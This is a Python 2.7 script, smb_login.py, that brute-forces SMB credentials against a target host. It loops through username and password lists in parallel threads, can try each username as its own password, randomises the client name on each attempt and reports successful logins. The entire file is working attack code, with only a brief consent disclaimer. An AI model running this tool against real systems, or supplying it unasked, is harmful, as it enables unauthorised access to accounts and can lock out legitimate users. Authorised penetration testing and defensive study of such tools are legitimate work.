#!/usr/bin/env python2.7

# Author: m8r0wn
# Script: smb_login.py

# Disclaimer:
# This tool was designed to be used only with proper
# consent. Use at your own risk.

from smb.SMBConnection import SMBConnection
from threading import Thread
import sys
from random import choice
from string import ascii_letters, digits
from list_targets import arg_parser, print_success, print_failure

def banner():
    print """
              smb_login.py
   -----------------------------------
Verify valid domain credentials or brute force
account passwords. Be careful of account lockouts!!

Login:
    -u      single username
    -U      username file

    -p      single password
    -P      password file

    -d      domain (default=Blank)

Options:
    -t      max thread count (default=2)
    -x      try username as password

Usage:
    python smb_login.py -u admin -P pass.txt 10.11.1.1
    python smb_login.py -u user -p passwd 192.168.5.1

NOTE: Having trouble? Use '' around input
    """
    sys.exit(0)

def smb_login(server, domain, user, passwd):
    #randomize client name each time
    client = ''.join([choice(ascii_letters + digits) for x in xrange(7)])
    try:
        #test smb connection
        conn = SMBConnection(user, passwd, client, server, domain=domain, use_ntlm_v2=True, is_direct_tcp=True)
        conn.connect(server, 445, timeout=2)
        # list shares with no output to test for valid connection
        conn.listShares(timeout=2)
        conn.close()
        print_success("Success %s %s:%s" % (server,user,passwd))
    except:
        print_failure("Login Failed %s %s:%s" % (server,user,passwd))

def main():
    # User input
    if "-h" in sys.argv or len(sys.argv) == 1: banner()

    server = sys.argv[-1]
    max_threads = arg_parser(name='max threads', flag='-t', type=int, default=2)
    domain = arg_parser(name='domain', flag='d', type=str, default=None)

    if "-U" in sys.argv:
        users = arg_parser(name='user', flag='-U', type=file, default=False)
    else:
        users = arg_parser(name='user', flag='-u', type=list, default=False)

    if "-P" in sys.argv:
        passwds = arg_parser(name='password', flag='-P', type=file, default=False)
    else:
        passwds = arg_parser(name='password', flag='-p', type=list, default=None)

    print "\n[*] Starting SMB brute force\n", "-"*29
    if "-x" in sys.argv:
        for u in users:
            smb_login(server,domain,u,u)

    for u in users:
        count = 0
        while count != len(passwds):
            threads = []
            #Start Threads
            for x in range(0, max_threads):
                if count != len(passwds):
                    t = Thread(target=smb_login, args=(server, domain, u, passwds[count]))
                    t.daemon = True
                    threads.append(t)
                    t.start()
                    count += 1
            for t in threads:
                t.join(1)
    print "\n[*] Scan Complete\n"
    sys.exit(0)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "\n[!] Key Event Detected...\n\n"
        sys.exit(0)